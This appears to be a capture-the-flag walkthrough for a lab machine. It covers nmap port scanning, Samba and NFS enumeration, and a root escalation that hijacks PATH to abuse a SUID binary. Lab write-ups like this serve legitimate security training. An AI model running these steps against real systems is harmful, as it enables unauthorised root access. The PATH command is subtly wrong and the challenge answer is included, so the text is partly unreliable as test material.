1 ~ Scan the machine.
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
2049/tcp open  nfs

```ANS: 7 ports are open ```

2 ~ Enumerating samba shares.
With `smbmap` or ``nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.149.207``

Samba is the standard Windows interoperability suite of programs for Linux and Unix. 
It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. 
Its often referred to as a network file system.

Samba is based on the common client/server protocol of Server Message Block (SMB). 
SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network.


3 ~ In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.149.207


3 ~ After logging in, we need to abuse suid binary file which is /usr/bin/menu

Strings is a command on Linux that looks for human readable strings on a binary.
This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

As this file runs as the root users privileges, we can manipulate our path gain a root shell.

To enumerate,used this code:



```
cd /tmp
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp/$PATH



```
